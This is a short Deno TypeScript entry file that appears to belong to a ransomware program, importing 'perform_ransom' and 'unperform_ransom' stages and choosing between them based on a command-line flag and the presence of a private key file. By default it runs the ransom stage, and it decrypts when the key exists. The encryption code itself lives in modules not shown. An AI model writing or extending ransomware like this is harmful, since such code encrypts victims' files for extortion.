import { performRansom } from "./stages/perform_ransom/perform_ransom.ts";
import { unperformRansom } from "./stages/unperform_ransom/unperform_ransom.ts";
import { exists } from "@std/fs/exists";

// Learn more at https://docs.deno.com/runtime/manual/examples/module_metadata#concepts
if (import.meta.main) {
  const param = Deno.args[0];
  const keyExists = await exists("./private_key.pem", { isFile: true });
  if (keyExists && param !== "--encrypt") {
    await unperformRansom();
  } else {
    await performRansom();
  }
}
